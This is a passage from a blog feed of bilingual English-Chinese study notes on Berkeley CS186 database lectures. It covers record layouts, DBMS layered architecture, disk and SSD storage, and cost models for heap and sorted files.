<li>Not bad for fixed length records too    对于固定长度的记录也不错
<ul>
<li>Re-arrange (e.g., sort) and squash null fields     重新排列(例如，排序)和压缩空字段</li>
<li>But for a whole table of fixed-length non-null records, can be worth the optimization of fixed length format   但是对于整张表的定长非空记录，可以值得优化定长格式</li>
</ul>
</li>
</ul>
<h3 id="Record-Layout"><a class="header-anchor" href="#Record-Layout">¶</a>Record Layout</h3>
<ul>
<li>记录的布局</li>
</ul>
<h4 id="Record-Formats"><a class="header-anchor" href="#Record-Formats">¶</a>Record Formats</h4>
<ul>
<li>Relational Model    关系模型→
<ul>
<li>Each record in table has some fixed type    每个记录都有固定的类型</li>
</ul>
</li>
<li>Assume System Catalog stores the Schema     假设有一个当前正在存储的表的架构
<ul>
<li>No need to store type information with records (save space!)     无需存储带有记录的类型信息(节省空间!)</li>
<li>Catalog is just another table …     目录只是另一个表…</li>
</ul>
</li>
<li>Goals:
<ul>
<li>Records should be compact in memory &amp; disk format     记录应以内存和磁盘格式压缩</li>
<li>Fast access to fields (why?)    快速访问字段</li>
</ul>
</li>
<li>Easy Case: Fixed Length Fields     简单情况:固定长度字段</li>
<li>Interesting Case: Variable Length Fields      有趣的案例:可变长度字段</li>
</ul>
<h4 id="Record-Formats-Fixed-Length"><a class="header-anchor" href="#Record-Formats-Fixed-Length">¶</a>Record Formats: Fixed Length</h4>
<blockquote>
<p>记录的格式：固定长度</p>
</blockquote>
<ul>
<li>
<p>Field types same for all records in a file.</p>
<blockquote>
<p>一个文件中所有记录的字段类型相同</p>
</blockquote>
<ul>
<li>Type into stored separately in system catalog.</li>
</ul>
</li>
<li>
<p>On disk byte representation same as in memory</p>
<blockquote>
<p>在磁盘上的字节表示也完全相同</p>
<p>将格式保留在内存中，并将逐字存储在磁盘上</p>
<p>实际上将在磁盘上保留原始内存表示形式（不会像Java那样进行序列化 ）</p>
</blockquote>
</li>
<li>
<p>Finding i’th field ?</p>
<ul>
<li>
<p>done via arithmetic (fast)</p>
<blockquote>
<p>通过算数来完成寻找记录中的第i字段（固定长度）</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Compact? (Nulls?)</p>
<blockquote>
<p>记录在内存中的分布是否紧凑？（如果有空记录，会造成内存空间的浪费）</p>
</blockquote>
</li>
</ul>
<h4 id="Record-Formats-Variable-Length"><a class="header-anchor" href="#Record-Formats-Variable-Length">¶</a>Record Formats: Variable Length</h4>
<ul>
<li>第一种：例如给只需要3字节的数据分配32字节
<ul>
<li>可能出现情况：数据长度超过分配的空间</li>
</ul>
</li>
<li>第二种：在字段之间使用分隔符，例如逗号
<ul>
<li>提取数据时：从左到右开始，计算逗号，直到到达正确的位置</li>
<li>可能出现情况1：分隔符本身也要作为数据存储到record内，但是分隔符内容有可能跟record内容产生冲突（例如重复），造成无法分辨分隔符的结果
<ul>
<li>逗号分隔值也是CSV文件等文本格式中常见的挑战→例如使用转义字符</li>
</ul>
</li>
<li>可能出现情况2：为了访问特定record，需要在内存中产生一些扫描成本</li>
</ul>
</li>
<li>第三种：引入一个Header（记录头）
<ul>
<li>在存储中，把可变长度字段放在最后，在Header中存储指向可变长度字段的指针</li>
<li>访问固定长度字段：采用算术计算长度 / 跟随指向变量的指针来直接访问</li>
<li>如果有空值→使指针指向与下一个指针相同的位置，</li>
</ul>
</li>
</ul>
<h3 id="Summary-v2"><a class="header-anchor" href="#Summary-v2">¶</a>Summary</h3>
<ul>
<li>^ ^？？？</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL3 Berkeley</title>
    <url>/2024/07/08/CS_Notes/Database/CS186%20SQL3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h1>SQL 3</h1>
<h2 id="Architecture-of-a-DBMS-SQL-Client"><a class="header-anchor" href="#Architecture-of-a-DBMS-SQL-Client">¶</a>Architecture of a DBMS: SQL Client</h2>
<ul>
<li>数据库管理系统的架构：SQL客户端</li>
<li>Database Management System</li>
</ul>
<h3 id="DBMS-Parsing-Optimization"><a class="header-anchor" href="#DBMS-Parsing-Optimization">¶</a>DBMS: Parsing &amp; Optimization</h3>
<ul>
<li>数据库管理系统（DBMS）：解析与优化</li>
</ul>
<h4 id="Purpose"><a class="header-anchor" href="#Purpose">¶</a>Purpose:</h4>
<ul>
<li>
<p>Parse, check, and verify the SQL, and translate into an efficient relational query plan</p>
</li>
<li>
<p>解析、检查和验证SQL语句，将其转换为高效的关系查询方案</p>
</li>
<li>
<pre><code class="language-sql">SELECT S.sid, S.sname, R.bid
FROM Sailors S, Reserves R
WHERE S.sid = R.sid and S.age &gt; 30
GROUP BY age
</code></pre>
</li>
</ul>
<h3 id="DBMS-Relational-Operators"><a class="header-anchor" href="#DBMS-Relational-Operators">¶</a>DBMS: Relational Operators</h3>
<ul>
<li>数据库管理系统（DBMS）：关系操作符</li>
</ul>
<h4 id="Purpose-v2"><a class="header-anchor" href="#Purpose-v2">¶</a>Purpose:</h4>
<ul>
<li>Execute a dataflow by operating on records and files</li>
<li>通过在记录和文件上执行数据流来操作数据</li>
</ul>
<h3 id="DBMS-Files-and-Index-Management"><a class="header-anchor" href="#DBMS-Files-and-Index-Management">¶</a>DBMS: Files and Index Management</h3>
<ul>
<li>文件和索引管理</li>
</ul>
<h4 id="Purpose-v3"><a class="header-anchor" href="#Purpose-v3">¶</a>Purpose:</h4>
<ul>
<li>Organize tables and Records as groups of pages in a logical file</li>
<li>将表和记录组织成逻辑文件中的页面组</li>
</ul>
<h3 id="DBMS-Buffer-Management"><a class="header-anchor" href="#DBMS-Buffer-Management">¶</a>DBMS: Buffer Management</h3>
<ul>
<li>缓冲区管理层</li>
</ul>
<h4 id="Purpose-v4"><a class="header-anchor" href="#Purpose-v4">¶</a>Purpose:</h4>
<ul>
<li>Provide the illusion of operating in memory</li>
<li>提供一种操作内存的假象</li>
</ul>
<h3 id="DBMS-Disk-Space-Management"><a class="header-anchor" href="#DBMS-Disk-Space-Management">¶</a>DBMS: Disk Space Management</h3>
<ul>
<li>磁盘空间管理</li>
</ul>
<h4 id="Purpose-v5"><a class="header-anchor" href="#Purpose-v5">¶</a>Purpose:</h4>
<ul>
<li>
<p>Translate page requests into physical bytes on one or more device(s)</p>
</li>
<li>
<p>将缓冲区管理器的页面请求转换为一个或多个设备（如磁盘、固态磁盘）上的物理字节</p>
</li>
</ul>
<h3 id="Architecture-of-a-DBMS"><a class="header-anchor" href="#Architecture-of-a-DBMS">¶</a>Architecture of a DBMS</h3>
<ul>
<li>数据库管理系统的架构
<ul>
<li>Organized in layers   层次架构</li>
<li>Each layer abstracts the layer below  每一层都抽象了其下的层次
<ul>
<li>Manage complexity    管理复杂性</li>
<li>Performance assumptions   性能假设</li>
</ul>
</li>
<li>Example of good systems design   DBMS是良好的系统设计示例</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>SQL CLIENT</th>
</tr>
</thead>
<tbody>
<tr>
<td>Query Parsing &amp; Optimization       <strong>解析与优化</strong></td>
</tr>
<tr>
<td>Relational Operators                         <strong>关系操作符</strong></td>
</tr>
<tr>
<td>Files and Index Management           <strong>文件和索引管理</strong></td>
</tr>
<tr>
<td>Buffer Management                            <strong>缓冲区管理</strong></td>
</tr>
<tr>
<td>Disk Space Management                     <strong>磁盘空间管理</strong></td>
</tr>
<tr>
<td>DBMS的架构通常分为几个层次，每一层都为上层提供服务，同时抽象了下层的复杂性。这种分层的设计有助于提高系统的可维护性和可扩展性</td>
</tr>
<tr>
<td>DATABASE</td>
</tr>
</tbody>
</table>
<h3 id="DBMS-Concurrency-Recovery"><a class="header-anchor" href="#DBMS-Concurrency-Recovery">¶</a>DBMS: Concurrency &amp; Recovery</h3>
<ul>
<li>
<p>并发控制与恢复（？</p>
</li>
<li>
<p>Two cross-cutting issues related to storage and memory management</p>
</li>
</ul>
<h2 id="Before-we-begin-storage-media"><a class="header-anchor" href="#Before-we-begin-storage-media">¶</a>Before we begin: storage media</h2>
<h3 id="Disks"><a class="header-anchor" href="#Disks">¶</a>Disks</h3>
<ul>
<li>Most database systems were originally designed for magnetic disks   大多数数据库系统最初是为磁盘设计的
<ul>
<li>Disk are a mechanical anachronism    磁盘是一种机械性的过时技术</li>
<li>Instilled design ideas that apply to using solid state disks as well    它所灌输的设计思想也适用于固态硬盘的使用</li>
</ul>
</li>
<li>Major implications   主要影响
<ul>
<li><strong>No “pointer derefs”</strong> .Instead, an API:   没有“指针解”引用
<ul>
<li>READ: transfer “page” of data from disk to RAM    （读取）将数据的“页面”从磁盘传输到RAM</li>
<li>WRITE: transfer “page” of data from RAM to disk      （写入）将数据的“页面”从RAM传输到磁盘</li>
</ul>
</li>
<li>Both API calls are very, very slow     这两个API调用都非常非常慢
<ul>
<li>Plan carefully   仔细规划</li>
</ul>
</li>
<li>An explicit API can be a good thing   明确的API
<ul>
<li>Minimizes the kind of pointer errors you see in C    最小化了你在C语言中看到的指针错误类型</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Storage-Hierarchy"><a class="header-anchor" href="#Storage-Hierarchy">¶</a>Storage Hierarchy</h3>
<ul>
<li>存储层次结构</li>
<li>存储层次结构是计算机系统中不同类型存储设备的层级排列，从最快的到最慢的【从上到下】</li>
</ul>
<table>
<thead>
<tr>
<th>registers   寄存器</th>
</tr>
</thead>
<tbody>
<tr>
<td>L1   Cache       L1缓存</td>
</tr>
<tr>
<td>L2   Cache       L2缓存</td>
</tr>
<tr>
<td>RAM                随机存取存储器</td>
</tr>
<tr>
<td>SSD                  固态硬盘</td>
</tr>
<tr>
<td>Disk                  磁盘</td>
</tr>
</tbody>
</table>
<ul>
<li>emmm，理解下来就是读写到磁盘很慢（？</li>
</ul>
<h3 id="Components-of-a-Disk-Pt-6"><a class="header-anchor" href="#Components-of-a-Disk-Pt-6">¶</a>Components of a Disk, Pt. 6</h3>
<ul>
<li>
<p>Platters spin(say 15000 rpm)</p>
</li>
<li>
<p>Arm assembly moved in or out to position a head on a desired track</p>
<ul>
<li>Tracks under heads make a “cylinder”</li>
</ul>
</li>
<li>
<p>Only one head reads/writes at any one time</p>
</li>
<li>
<p>Block/page size is a multiple of (fixed) sector size</p>
</li>
<li>
<p>这个地方是磁盘结构的解释，所以待插入一张结构图，就一览了然了，当然目前我还不会插图片，后面来</p>
</li>
</ul>
<p><img src="https://notes.bencuan.me/cs186/Disks,%20Buffers,%20Files/Untitled%201.png" alt="Untitled|400"></p>
<h3 id="Accessing-a-Disk-page"><a class="header-anchor" href="#Accessing-a-Disk-page">¶</a>Accessing a Disk page</h3>
<ul>
<li>
<p>访问磁盘界面</p>
</li>
<li>
<p>Time to access (read/write)  a disk block:    读写磁盘块的时间   以下也涉及到磁盘结构那张图</p>
<ul>
<li>seek time (moving arms to position disk head on track)
<ul>
<li>~2-3 ms on average   寻道时间   磁盘头读取所需的磁道的位置</li>
</ul>
</li>
<li>rotational delay (waiting for block to rotate under head)
<ul>
<li>~0-4 ms (15000 RPM)   旋转延迟时间</li>
</ul>
</li>
<li>transfer time (actually moving data to/from disk surface)
<ul>
<li>~0.25 ms per 64KB page   将数据从磁盘表面移动到磁盘头/从磁盘头移动到磁盘表面得到时间</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Key to lower I/O cost: reduce seek/rotational delays    降低I/O成本的关键：减少寻道和旋转延迟的时间</p>
</li>
</ul>
<h3 id="Notes-on-Flash-SSD"><a class="header-anchor" href="#Notes-on-Flash-SSD">¶</a>Notes on Flash(SSD)</h3>
<ul>
<li>闪存/固态磁盘Solid State Disks，闪存通常组合在一起形成称为固态磁盘的磁盘驱动器</li>
<li>Issues in current generation (NAND)
<ul>
<li>Fine-grain reads (4-8K reads), coarse-grain writes (1-2 MB writes)    <strong>细粒度读取（Fine-grain reads）</strong>：可以进行4-8KB的细粒度读取;   <strong>粗粒度写入（Coarse-grain writes）</strong>：写入操作通常是1-2MB的粗粒度</li>
<li>Only 2k-3k erasures before failure, so keep moving hot write units around (“wear leveling”)     闪存的寿命限制：通常在2000到3000次擦除周期后可能发生故障，因此需要不断移动热点写入单元（“磨损均衡” wear leveling）</li>
<li>write amplification: big units, need to reorg for wear &amp; garbage collection    <strong>写入放大（Write amplification）</strong>：由于写入单元较大，需要重新组织数据以进行磨损均衡和垃圾收集</li>
</ul>
</li>
<li>So <strong>read</strong> is fast and predictable
<ul>
<li>Single read access time: 0.03 ms</li>
<li>4 KB random reads: ~500MB/sec</li>
<li>Sequential reads: ~525MB/sec</li>
<li>64K: 0.48 ms</li>
<li>在闪存中，顺序读取和随机读取的带宽速度大致一样</li>
</ul>
</li>
<li>But write is not . Slower for random
<ul>
<li>Single write access time: 0.03 ms   单次写入挺快的</li>
<li>4 KB random writes: ~120 MB/sec</li>
<li>Sequential writes: ~480 MB/sec</li>
<li>顺序写入相比随机写入速度快很多</li>
</ul>
</li>
<li>Flash is faster than disk. But disk offers about 10x the capacity per $就是disk在相等价钱下提供的容量更大（自分の理解）</li>
</ul>
<h2 id="Storage-Pragmatics-Trends"><a class="header-anchor" href="#Storage-Pragmatics-Trends">¶</a>Storage Pragmatics &amp; Trends</h2>
<ul>
<li>Many significant DBs are not big, but data sizes grow faster than Moore’s Law (“Big Data” is real) , so the role of disk, flash, RAM → to debate</li>
</ul>
<h3 id="Bottom-Line-last-few-years"><a class="header-anchor" href="#Bottom-Line-last-few-years">¶</a>Bottom Line (last few years)</h3>
<ul>
<li>Very large DBs: relatively traditional   非常大的数据库（Very large DBs）: 相对传统
<ul>
<li>Disk still the best cost/MB by a lot    磁盘仍然是成本/每兆字节（cost/MB）比最高的存储介质</li>
<li>SSDs improve performance and performance variance   固态硬盘（SSDs）提高了性能和性能的一致性</li>
</ul>
</li>
<li>Smaller DB story is changing quickly   小型数据库
<ul>
<li>Entry cost for disk is not cheap, so flash wins at the low end     磁盘的入门成本高，在低端市场闪存（flash）√</li>
<li>Many interesting databases fit in RAM     许多有趣的数据库可以完全装入RAM</li>
</ul>
</li>
</ul>
<h2 id="Disks-and-Files"><a class="header-anchor" href="#Disks-and-Files">¶</a>Disks and Files</h2>
<ul>
<li>Recall, most DBMSs stores information on <strong>Disks</strong> and <strong>SSDs</strong>   <u><strong>对以上Disk和SSD讨论的总结</strong></u>
<ul>
<li>Disk are a mechanical anachronism(slow)</li>
<li>SSDs faster, <strong>slow relative to memory</strong>, costly writes</li>
</ul>
</li>
</ul>
<h3 id="Block-Level-Storage"><a class="header-anchor" href="#Block-Level-Storage">¶</a>Block Level Storage</h3>
<ul>
<li>
<p><strong>块级存储</strong></p>
</li>
<li>
<p>Read and Write <strong>large chunks of sequential bytes</strong>   读写大顺序字节块：块级存储系统设计为一次读取或写入<strong>大的连续字节块</strong></p>
</li>
<li>
<p>Sequentially: “Next” disk block is fastest   顺序性：在顺序访问中，读取或写入“下一个”磁盘块是最快的</p>
</li>
<li>
<p>Maximize usage of data per Read/Write    最大化每次读写的数据使用量</p>
<ul>
<li>“Amortize” seek delays(HDDs) and writes (SSDs)   分摊   硬盘驱动器上的寻道延迟    以及旋转延迟    翻译器：通过<strong>分摊</strong>硬盘驱动器（HDD）上的寻道延迟和固态硬盘（SSD）上的写入放大，来提高效率</li>
</ul>
</li>
<li>
<p>Predict future behavior   预测未来行为</p>
<ul>
<li>Cache popular blocks   缓存热门块，将频繁访问的数据块存储在快速访问的缓存中</li>
<li>Pre-fetch likely-to-be-accessed blocks    预取可能访问的块，根据访问模式预测并提前加载数据块</li>
<li>Buffer writes to sequential blocks    缓冲顺序块的写入，将写入操作暂时存储，然后一次性写入到顺序的磁盘块中</li>
</ul>
</li>
</ul>
<h3 id="A-Note-on-Terminology"><a class="header-anchor" href="#A-Note-on-Terminology">¶</a>A Note on Terminology</h3>
<ul>
<li>术语解释</li>
<li>Block = Unit of transfer for disk read/write   <strong>块</strong>：磁盘读写操作的数据传输单元
<ul>
<li>64 KB - 128 KB is a good number today    64KB到128KB是一个常见的块大小</li>
<li>Book says 4 KB   书籍中可能提到4KB作为块大小的标准</li>
</ul>
</li>
<li>Page: a common synonym for “block”    <strong>页面</strong>：通常是“块”的同义词
<ul>
<li>In some texts, “page” = a block-sized chunk of RAM    在某些文献中，“页面”指的是RAM中与块大小相等的数据块</li>
</ul>
</li>
<li>treat “block” and “page” as synonyms     将“块”和“页面”视为可以互换的同义词</li>
</ul>
<h3 id="Arranging-Blocks-on-Disk"><a class="header-anchor" href="#Arranging-Blocks-on-Disk">¶</a>Arranging Blocks on Disk</h3>
<ul>
<li>
<p>在磁盘上排列块</p>
</li>
<li>
<p>‘Next’ block concept:</p>
<ul>
<li>sequential blocks on same track, followed by     位于同一磁道上的顺序块</li>
<li>blocks on same cylinder, followed by  位于同一柱面上的块</li>
<li>blocks on adjacent cylinder   相邻柱面上的块</li>
</ul>
</li>
<li>
<p>Arrange file pages sequentially by ‘next’ on disk     按磁盘上的“下一个”顺序排列文件页面</p>
<ul>
<li>minimize seek and rotational delay     最小化寻道和旋转延迟</li>
</ul>
</li>
<li>
<p>For a sequential scan, pre-fetch    对于顺序扫描，进行预取</p>
<ul>
<li>several blocks at a time    一次预取多个块</li>
</ul>
</li>
<li>
<p>Read large consecutive blocks     读取大的连续块</p>
</li>
</ul>
<h3 id="Disk-Space-Management"><a class="header-anchor" href="#Disk-Space-Management">¶</a>Disk Space Management</h3>
<ul>
<li>
<p>磁盘空间管理</p>
</li>
<li>
<p>Lowest layer of DBMS, manages space on disk</p>
</li>
<li>
<p>Purpose:</p>
<ul>
<li>Map pages to locations on disk    将页面映射到磁盘上的位置</li>
<li>Load pages from disk to memory   从磁盘加载页面到内存</li>
<li>Save pages back to disk &amp; ensuring writes    将页面保存回磁盘并确保写入</li>
</ul>
</li>
<li>
<p>Higher levels call upon this layer to :    更高层级调用这一层来：</p>
<ul>
<li>Read/write a page     读写页面</li>
<li>Allocate/de-allocate logical pages    分配/释放逻辑页面</li>
</ul>
</li>
</ul>
<h4 id="Requesting-Pages"><a class="header-anchor" href="#Requesting-Pages">¶</a>Requesting Pages</h4>
<ul>
<li>
<p>请求页面</p>
</li>
<li>
<p>Request for s sequences of pages best satisfied by pages stored sequentially on disk     对页面序列的请求最好由磁盘上顺序存储的页面满足</p>
<ul>
<li>Physical details hidden from higher levels of systems    物理细节对系统更高层级隐藏</li>
<li>Higher levels may “safely” assume Next Page is fast, so they will simply expect sequential runs of pages to be quick to scan   更高层级可能“安全地”假设下一页很快，因此他们将期望页面的顺序运行快速扫描</li>
<li>尼玛好抽象……</li>
</ul>
</li>
</ul>
<h4 id="Implementation"><a class="header-anchor" href="#Implementation">¶</a>Implementation</h4>
<ul>
<li>
<p>实现</p>
</li>
<li>
<p>Proposal 1：Talk to the storage device directly   数据库存储软件直接与存储设备对话，存储设备绕过操作系统的任何功能导出的协议</p>
<ul>
<li>could be very fast if u knew the device well   数据库系统直接连接到硬件，速度尽可能的快</li>
<li>when devices change    设备可能变换，所以这个proposal不适用了</li>
</ul>
</li>
<li>
<p>Proposal 2: Run over filesystems (FS)</p>
<ul>
<li>Allocate single large “contiguous” file on a nice empty disk and assume sequential / nearby byte access are fast     在一个干净的空磁盘上分配一个大的“连续”文件，并假设顺序/附近的字节访问是快速的</li>
<li>Most FS optimize disk layout for sequential access    大多数文件系统优化磁盘布局以进行顺序访问
<ul>
<li>Gives us more or less what we want if we start with an empty disk</li>
</ul>
</li>
<li>DBMS “file” may span multiple FS files on multiple disks/machines      DBMS的“文件”可能跨越多个磁盘/机器上的多个文件系统文件</li>
</ul>
</li>
</ul>
<h3 id="Summary-Disk-Space-Management"><a class="header-anchor" href="#Summary-Disk-Space-Management">¶</a>Summary: Disk Space Management</h3>
<ul>
<li>provide API to read and write pages to device    提供API以向设备读写页面</li>
<li>Pages: block level organization of bytes on disk    页面：磁盘上字节的块级组织</li>
<li>Provides “next” locality and abstracts FS/device details    提供“下一个”局部性并抽象文件系统/设备细节</li>
</ul>
<h2 id="Disks-and-Files-Summary"><a class="header-anchor" href="#Disks-and-Files-Summary">¶</a>Disks and Files: Summary</h2>
<ul>
<li>Magnetic (hard) disks and SSDs   磁性（硬）磁盘和固态硬盘（SSDs）
<ul>
<li>Basic HDD mechanics   基本的HDD机械特性</li>
<li>SSD write amplification    SSD写入放大</li>
<li>Concept of “near” pages and how it relates to cost of access   近邻页面的概念以及相对成本</li>
<li>Relative cost of
<ul>
<li>Random vs. sequential disk access (10x)    随机访问与顺序磁盘访问</li>
<li>Disk (pluto 冥王星) vs RAM (sacramento) vs. registers (your head)     磁盘（以冥王星为例）与RAM（以萨克拉门托为例？不懂）与寄存器（你的头脑）
<ul>
<li>Big differences</li>
<li>不同存储介质的成本和性能有显著差异，寄存器最快但容量最小，RAM容量较大且速度很快，而磁盘提供了巨大的存储容量但速度相对较慢</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>DB File storage
<ul>
<li>Typically over FS file(s)    通常通过文件系统（FS）上的一个或多个文件来实现</li>
</ul>
</li>
<li>Disk space manager loads and stores pages
<ul>
<li>Block level reasoning     基于块级逻辑进行操作</li>
<li>Abstracts device and file system; provide fast “next”     抽象化了设备和文件系统的细节；提供快速的“下一个”页面访问</li>
</ul>
</li>
</ul>
<h1>写在后面</h1>
<p>抽象啊（流口水</p>
<p>不过也算有所收获</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL5 Berkeley</title>
    <url>/2024/08/27/CS_Notes/Database/CS186%20SQL5%20Disks,%20Files%20and%20Buffers%20II/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-5-File-Organizations"><a class="header-anchor" href="#SQL-5-File-Organizations">¶</a>SQL 5  File Organizations</h2>
<h3 id="Recall-Heap-Files"><a class="header-anchor" href="#Recall-Heap-Files">¶</a>Recall: Heap Files</h3>
<blockquote>
<p>回顾：堆文件</p>
</blockquote>
<ul>
<li>
<p>Unordered collection of records</p>
<blockquote>
<p>记录的无序集合</p>
</blockquote>
</li>
<li>
<p>Recall API for higher layers of the DBMS</p>
<blockquote>
<p>用于数据库管理系统的更高层的API</p>
</blockquote>
<ul>
<li>Insert / delete / modify record   增删改记录</li>
<li>Fetch a particular record by <em>record id</em>   通过记录id获取特定记录
<ul>
<li>Record id is a pointer encoding pair of (<strong>pageID, location</strong> on page)   记录ID是一个指针，根据<strong>页面ID+记录位置</strong>编码而成的指针</li>
</ul>
</li>
<li>Scan all records   扫描所有记录
<ul>
<li>Possibly with some conditions on the records to be retrieved</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Recall-Multiple-File-Organizations"><a class="header-anchor" href="#Recall-Multiple-File-Organizations">¶</a>Recall: Multiple File Organizations</h3>
<blockquote>
<p>数据库中的多种文件组织性质</p>
</blockquote>
<ul>
<li>
<p>Many alternatives exist, each good in some situationa and less so in others</p>
<blockquote>
<p>各种文件形式都各有好坏</p>
</blockquote>
</li>
<li>
<p><strong>Heap Files</strong>：Suitable when typical access is a full scan of all record   堆文件→适用于对所有记录的完整浏览</p>
</li>
<li>
<p><strong>Sorted Files</strong>：Best for retrieval in order, or when a range of records is needed   排序文件→适用于按顺序检索，尤其是需要同时检索若干个记录时</p>
</li>
<li>
<p><strong>Clustered Files &amp; Indexes</strong>：Group data into blocks to enable fast <em>lookup</em> and efficient modifications    集群文件和索引→适用于将数据分组到块中，实现快速查找和高效修改</p>
</li>
</ul>
<h3 id="Question"><a class="header-anchor" href="#Question">¶</a>Question</h3>
<ul>
<li>What is the “best” file organization?   最好的文件组织形式是什么？
<ul>
<li>取决于access pattern   即对数据库的访问模式</li>
</ul>
</li>
</ul>
<h3 id="COST-MODEL-AND-ANALYSIS"><a class="header-anchor" href="#COST-MODEL-AND-ANALYSIS">¶</a>COST MODEL AND ANALYSIS</h3>
<blockquote>
<p>成本模型和分析</p>
</blockquote>
<ul>
<li>
<p><strong>B</strong>：The number of data blocks in the file</p>
<blockquote>
<p>B→文件中的数据块的数量</p>
</blockquote>
</li>
<li>
<p><strong>R</strong>：Number of records per block</p>
<blockquote>
<p>R→每个数据块中的记录数量</p>
</blockquote>
</li>
<li>
<p><strong>D</strong>：(Average) time to read / write disk block</p>
<blockquote>
<p>D→读写磁盘块的平均时间</p>
</blockquote>
</li>
<li>
<p>Focus：Average case analysis for uniform random workloads   对统一的随机工作负载进行平均案例分析</p>
</li>
</ul>
<h3 id="Find-Key-x-Heap-File"><a class="header-anchor" href="#Find-Key-x-Heap-File">¶</a>Find Key x: Heap File</h3>
<blockquote>
<p>在堆文件形式中寻找某一记录x</p>
</blockquote>
<ul>
<li><strong>P(i)</strong>：Probability that key is on page <em>i</em> is <strong>1/B</strong></li>
<li><strong>T(i)</strong>： Number of pages touched if key on page <em>i</em> is <strong>i</strong></li>
<li>此处缺一张图    <a href="https://www.youtube.com/watch?v=CFJXoGujBAg&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=39">Lec 5 Part 4 Equality (youtube.com)</a>   1:17</li>
<li>平均检索x的成本：<strong>∑P(i) * T(i)</strong> = <strong>2/B</strong></li>
</ul>
<h3 id="Find-Key-x-Sorted-File"><a class="header-anchor" href="#Find-Key-x-Sorted-File">¶</a>Find Key x: Sorted File</h3>
<blockquote>
<p>在排序文件中寻找某一记录x</p>
</blockquote>
<ul>
<li><strong>Worst-case</strong>: Pages touched in binary search   采用二分搜索
<ul>
<li><strong>log2 (B)</strong></li>
</ul>
</li>
<li><strong>Average-case</strong>
<ul>
<li><strong>log2 (B) - (B - 1) / B</strong></li>
</ul>
</li>
<li>可以把二分搜索的过程画成二分树理解一下</li>
<li>推导的过程在<a href="https://www.youtube.com/watch?v=CFJXoGujBAg&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=39">Lec 5 Part 4 Equality (youtube.com)</a>   4:00左右   此处还是缺图。。。</li>
</ul>
<h3 id="Find-Keys-Between-x-and-y-Heap-File"><a class="header-anchor" href="#Find-Keys-Between-x-and-y-Heap-File">¶</a>Find Keys Between x and y:  Heap File</h3>
<blockquote>
<p>在堆形式文件中寻找范围从x到y的若干记录</p>
</blockquote>
<ul>
<li>
<p>Always touch all blocks</p>
<blockquote>
<p>基本都要遍历所有项，因为无序+可能存在重复项</p>
</blockquote>
</li>
</ul>
<h3 id="Find-Keys-Between-x-and-y-Comparison-between-Heap-File-and-Sorted-File"><a class="header-anchor" href="#Find-Keys-Between-x-and-y-Comparison-between-Heap-File-and-Sorted-File">¶</a>Find Keys Between x and y:  Comparison between Heap File and Sorted File</h3>
<blockquote>
<p>比较在堆形式文件和排序文件中寻找范围从x到y的若干记录</p>
</blockquote>
<ul>
<li>
<p>Heap File   堆</p>
<ul>
<li>
<p>Find beginning of range</p>
<blockquote>
<p>从开头开始搜索</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>Sorted File  排序文件</p>
<ul>
<li>可以采用二分搜索</li>
</ul>
</li>
</ul>
<h3 id="Insert-x-Heap-File"><a class="header-anchor" href="#Insert-x-Heap-File">¶</a>Insert x: Heap File</h3>
<blockquote>
<p>在堆形式文件中插入记录x</p>
</blockquote>
<ul>
<li>
<p>在堆末尾插入</p>
</li>
<li>
<p>插入成本：**2 * D ** = 读取该页 + 写入数据 + 把该内存区域写回磁盘上的页面【即读取+写入=2D】</p>
</li>
<li>
<p>注：每次处理磁盘上的数据时，不是直接对磁盘进行操作</p>
<ul>
<li>而是：从<strong>磁盘读取</strong>数据后，在<strong>内存中操作</strong>数据，然后将<strong>内存缓冲区写回</strong>磁盘</li>
<li>所以任何的数据修改都会产生双重成本【读取+写入】</li>
</ul>
</li>
</ul>
<h3 id="Insert-x-Heap-Vs-Sorted"><a class="header-anchor" href="#Insert-x-Heap-Vs-Sorted">¶</a>Insert x: Heap Vs Sorted</h3>
<ul>
<li>Heap File    堆文件
<ul>
<li>Read last page, append, write. Cost = 2 * D   读取最后一部分，添加数据，写入磁盘</li>
</ul>
</li>
<li>Sorted File
<ul>
<li>Find location for record.  Cost = log2 (BD)  遍历找到插入位置</li>
<li>insert and shift rest of file    插入并移动文件的其余部分</li>
</ul>
</li>
</ul>
<h3 id="Delete-x-Heap-File"><a class="header-anchor" href="#Delete-x-Heap-File">¶</a>Delete x: Heap File</h3>
<blockquote>
<p>在堆形式文件中删除记录x</p>
</blockquote>
<ul>
<li>Average case to find the record: <strong>B / 2  reads</strong></li>
<li>Delete record from page</li>
<li>Cost = (B / 2 + 1) * D
<ul>
<li>找到要删除的数据的位置 + 删除操作</li>
</ul>
</li>
</ul>
<h3 id="Delete-x-Heap-File-Vs-Sorted-File"><a class="header-anchor" href="#Delete-x-Heap-File-Vs-Sorted-File">¶</a>Delete x: Heap File Vs Sorted File</h3>
<blockquote>
<p>比较在堆形式文件和中寻找范围从x到y的若干记录</p>
</blockquote>
<ul>
<li>Heap File    堆文件
<ul>
<li>Average case runtime: (B / 2 + 1) * D</li>
</ul>
</li>
